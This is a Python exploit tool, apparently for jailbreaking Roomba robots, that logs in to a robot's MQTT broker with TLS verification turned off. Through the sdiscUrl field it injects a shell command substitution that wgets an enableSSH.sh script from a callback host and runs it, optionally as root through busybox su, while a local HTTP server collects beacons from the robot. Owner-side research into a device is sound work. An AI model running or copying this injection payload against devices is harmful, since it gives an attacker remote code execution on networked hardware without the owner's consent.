import argparse
import json
import math
import os
import socket
import ssl
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import cast

import paho.mqtt.client as mqtt
from paho.mqtt.enums import CallbackAPIVersion

# connectivity_manager rejects any sdiscUrl longer than this (cmp r0,0xbf at 0x101d0).
SDISCURL_MAX_BYTES = 191

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

httpd : HTTPServer|None = None

LOCAL_IP = None
mqttc = None
CONNECT_TIMEOUT = 10.0
PUBLISH_TIMEOUT = 5.0
CLEANUP_TIMEOUT = 1.0
DELTA = "delta"
RUNJAILED_HOME = "/data/opt/irobot/persistent/opt/runjailed"
AVAILABLE_CMD_SPACE = 1

def sendCmd(cmd: str):
    """Publish the raw string as state.sdiscUrl on topic delta.

    local_manager bridges the external topic ``delta`` to the internal topic
    ``local/delta``, which connectivity_manager subscribes to. Publishing on
    ``wifictl`` never reaches the sdiscUrl handler.

    True only means Paho accepted the publish locally. It does not confirm
    broker delivery, robot processing, or shell execution.
    """
    return _publish_cmd(cmd).rc == mqtt.MQTT_ERR_SUCCESS


def _publish_cmd(cmd: str):
    """Keep MQTTMessageInfo so the CLI can wait for the complete local send."""
    if not isinstance(cmd, str) or len(cmd.encode()) > SDISCURL_MAX_BYTES:
        raise ValueError("cmd must be a string of at most 191 bytes")
    if mqttc is None:
        raise RuntimeError("MQTT client is not initialized")
    # local_manager accepts only fixed header 0x30: QoS 0, no RETAIN/DUP.
    return mqttc.publish("delta", json.dumps({"state": {"sdiscUrl": cmd}}), qos=0, retain=False)

def sendChunkedCommand(cmd: str, file: str|None = "I", display: str|None = None):
    raise NotImplementedError("Shell commands are unsupported: sendCmd only configures a discovery URL")


def runAsRoot(cmd: str, file:str="I"):
    raise NotImplementedError("Root commands are unsupported: sendCmd only configures a discovery URL")


def enableSshUrl(host: str, port: int = 8899, beacon_port: int = 8883,
                 busybox: str = "/bin/busybox", use_su: bool = False) -> str:
    """Build the sdiscUrl payload that makes connectivity_manager fetch and run
    enableSSH.sh.

    use_su wraps the command in ``busybox su -c`` so it runs as root. That needs
    a setuid busybox, which the examined firmware image does not show, so the
    default fetches and runs as the connectivity user (``apps``) instead.
    """
    fetch = (f"wget -qO/tmp/e http://{host}:{port}/enableSSH.sh;"
             f"sh /tmp/e {host} {port} {beacon_port}")
    inner = f"{busybox} su -c '{fetch}'" if use_su else fetch
    url = f"https://$({inner})"
    if len(url.encode()) > SDISCURL_MAX_BYTES:
        raise ValueError(f"payload is {len(url.encode())} bytes, max {SDISCURL_MAX_BYTES}")
    return url


class ConnectionState:
    def __init__(self):
        self.connack = threading.Event()
        self.disconnected = threading.Event()
        self.accepted = False
        self.error = None


def on_connect(client, userdata, flags, reason_code, properties):
    userdata.accepted = reason_code == 0
    if userdata.accepted:
        print("Connected successfully!", flush=True)
        client.subscribe("$SYS/#")
    else:
        userdata.error = f"MQTT connection rejected: {reason_code}"
    userdata.connack.set()


def on_disconnect(client, userdata, disconnect_flags, reason_code, properties):
    userdata.error = f"MQTT disconnected: {reason_code}"
    userdata.disconnected.set()
    # Wake the initial waiter even if no CONNACK arrived.
    userdata.connack.set()


def _check_connection(state):
    if state.disconnected.is_set():
        raise RuntimeError(state.error or "MQTT disconnected")


def on_message(client, userdata, msg):
    # $SYS/# and other broker traffic is not JSON; do not kill the network loop.
    if "shadow/update" not in msg.topic:
        return
    try:
        pl = json.loads(msg.payload)
        robotDat = pl['state']['reported']
    except (ValueError, KeyError, TypeError):
        return
    print("Discovered: " + robotDat.get('sku', '?') + " on " + robotDat.get('softwareVer', '?'))

    print("Automatic jailbreak workflow is disabled: sendCmd only configures a discovery URL.")

class RunjailedHTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass

    def do_GET(self):
        self.send_response(200)
        
        self.send_header("Content-type", "text/plain")
        self.end_headers()

        # Also append to a log so callers that redirect stdout (oneclick-ssh.sh)
        # can observe the beacons without racing the process's own output.
        beacon_log = os.environ.get("RUNJAILED_BEACON_LOG")
        if beacon_log:
            with open(beacon_log, "a") as fh:
                fh.write(self.path + "\n")
        
        if "done/downloading" in self.path:
          print("[SUCCESS] Downloaded all scripts, now unlocking!")
        if "done/unlocking" in self.path:
          print("[SUCCESS] Unlocked!")
        if "done/ssh" in self.path:
          print("[SUCCESS] Enabled SSH!")
        if "done/http" in self.path:
          print("[SUCCESS] Enabled HTTP!")
        if "whoami/" in self.path:
          usr = self.path.split("whoami/")[1]
          pref = "[SUCCESS]" if "root" in usr else "[FAIL?]"
          print(f"{pref} Running script on Roomba as {usr}.")
        if "version/" in self.path:
          ver = self.path.split("version/")[1]
          print(f"[SUCCESS] Downloaded roomba::unjailed v{ver} to Roomba.")

def main():
    global LOCAL_IP, httpd, mqttc
    # Redirected stdout is block-buffered, which hides progress from callers polling the log.
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(line_buffering=True)
    parser = argparse.ArgumentParser("runjailed")
    parser.add_argument("--ip", "-i", dest="ip", help="Your robot's IP", required=True, type=str)
    parser.add_argument("--blid", "-b", dest="blid", help="Your robot's BLID (or $ROOMBA_BLID)",
                        default=os.environ.get("ROOMBA_BLID"), type=str)
    parser.add_argument("--password", "-p", dest="password",
                        help="Your robot's password (or $ROOMBA_PASSWORD)",
                        default=os.environ.get("ROOMBA_PASSWORD"), type=str)
    parser.add_argument("--callback", "-c", dest="cb", help="Your computer's LAN IP", required=False, type=str)
    parser.add_argument("--beacon-port", dest="beacon_port", type=int, default=8883,
                        help="local port for the HTTP beacon server (default 8883)")
    parser.add_argument("--send", dest="send", action="append", default=[], metavar="URL",
                        help="publish this state.sdiscUrl value after connecting (repeatable)")
    parser.add_argument("--enable-ssh", dest="enable_ssh", metavar="HOST[:PORT]",
                        help="publish the payload that runs enableSSH.sh on the robot as root")
    parser.add_argument("--send-delay", dest="send_delay", type=float, default=1.5,
                        help="seconds between publishes (default 1.5)")
    parser.add_argument("--linger", dest="linger", type=float, default=15,
                        help="seconds to keep the beacon server up after sending (default 15)")

    args = parser.parse_args()
    for name in ("send_delay", "linger"):
        value = getattr(args, name)
        if not math.isfinite(value) or value < 0:
            parser.error(f"--{name.replace('_', '-')} must be finite and nonnegative")
    if not args.blid:
        parser.error("--blid is required (or set ROOMBA_BLID)")
    if not args.password:
        parser.error("--password is required (or set ROOMBA_PASSWORD)")

    urls = list(args.send)
    if args.enable_ssh:
        host, _, port = args.enable_ssh.partition(":")
        urls.append(enableSshUrl(host, int(port or 8899), args.beacon_port,
                                 busybox=os.environ.get("ROOMBA_BUSYBOX", "/bin/busybox")))

    LOCAL_IP = args.cb or get_local_ip()

    server_address = ('', args.beacon_port)
    httpd = HTTPServer(server_address, RunjailedHTTPHandler)

    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()

    state = ConnectionState()
    mqttc = mqtt.Client(CallbackAPIVersion.VERSION2, userdata=state,
                        reconnect_on_failure=False)
    mqttc.on_connect = on_connect
    mqttc.on_message = on_message
    mqttc.on_disconnect = on_disconnect
    started = False
    try:
        mqttc.tls_set(cert_reqs=ssl.CERT_NONE)
        mqttc.tls_insecure_set(True) # Firmware certificate expired on Dec 31 2025.
        mqttc.username_pw_set(args.blid, args.password)
        mqttc.connect_timeout = CONNECT_TIMEOUT
        if mqttc.connect(args.ip, 8883, 60) != mqtt.MQTT_ERR_SUCCESS:
            raise RuntimeError("MQTT connect failed")
        if mqttc.loop_start() != mqtt.MQTT_ERR_SUCCESS:
            raise RuntimeError("MQTT network loop failed to start")
        started = True
        if not state.connack.wait(CONNECT_TIMEOUT):
            raise TimeoutError("MQTT CONNACK timed out")
        if not state.accepted:
            raise RuntimeError(state.error or "MQTT connection rejected")
        _check_connection(state)
        if not urls:
            # Preserve the original passive CLI mode when no send was requested.
            state.disconnected.wait()
            _check_connection(state)
        for index, url in enumerate(urls):
            _check_connection(state)
            info = _publish_cmd(url)
            if info.rc != mqtt.MQTT_ERR_SUCCESS:
                raise RuntimeError(f"MQTT publish failed: rc={info.rc}")
            info.wait_for_publish(timeout=PUBLISH_TIMEOUT)
            if not info.is_published():
                raise TimeoutError("MQTT local send timed out")
            _check_connection(state)
            print(f"sendCmd locally sent bytes={len(url.encode())}: {url}", flush=True)
            if index + 1 < len(urls):
                state.disconnected.wait(args.send_delay)
                _check_connection(state)
        # QoS 0 confirms only local socket send, not broker/robot processing.
        if args.linger:
            print(f"listening for beacons for {args.linger:g}s ...", flush=True)
            state.disconnected.wait(args.linger)
        _check_connection(state)
        return 0
    except (OSError, ValueError, RuntimeError) as exc:
        print(f"MQTT failed: {exc}", file=sys.stderr, flush=True)
        return 1
    finally:
        try:
            mqttc.disconnect()
        finally:
            try:
                if started:
                    sock = cast(socket.socket | None, mqttc.socket())
                    if sock is not None and not state.disconnected.wait(CLEANUP_TIMEOUT):
                        # loop_stop joins Paho, which otherwise keeps draining an
                        # unwritable queue. Unblock its select/read on timeout.
                        try:
                            sock.shutdown(socket.SHUT_RDWR)
                        except OSError:
                            pass  # The network loop may already have closed it.
                    mqttc.loop_stop()
            finally:
                httpd.shutdown()
                httpd.server_close()
                t.join()


if __name__ == "__main__":
    sys.exit(main())
